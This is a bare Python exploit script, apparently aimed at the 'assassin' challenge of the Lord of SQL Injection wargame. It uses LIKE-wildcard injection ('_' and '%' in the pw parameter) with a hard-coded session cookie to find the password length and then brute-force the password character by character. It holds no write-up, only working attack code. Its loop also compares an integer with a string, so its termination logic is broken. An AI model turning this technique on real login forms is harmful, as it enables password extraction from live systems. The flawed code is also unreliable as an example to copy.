import urllib.parse as urllib
import urllib.request as urllib2
import sys
import time

string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-_+="
key = ""
cur_len = "_"

while True:
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="+ cur_len + "%"
    print(url)

    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url)
    request.add_header('Cookie', 'PHPSESSID=lipbqhn53afq7q0j2rc4gmoeja')
    request.get_method = lambda:'GET'
    data = opener.open(request)
    data = data.read()

    if bytes("Hello guest", 'utf-8') not in data:
        break
    else:
        cur_len += "_"

print(len(cur_len))


while len(key) != cur_len:
    for j in range(len(string)):
        url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="+ key + string[j] + "%"
        print(url)

        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'PHPSESSID=lipbqhn53afq7q0j2rc4gmoeja')
        request.get_method = lambda:'GET'
        data = opener.open(request)
        data = data.read()

        if bytes("Hello admin", 'utf-8') in data:
            key += string[j]
            break

        if bytes("Hello guest", 'utf-8') in data:
            key += string[j]
            break
        
print(key)



 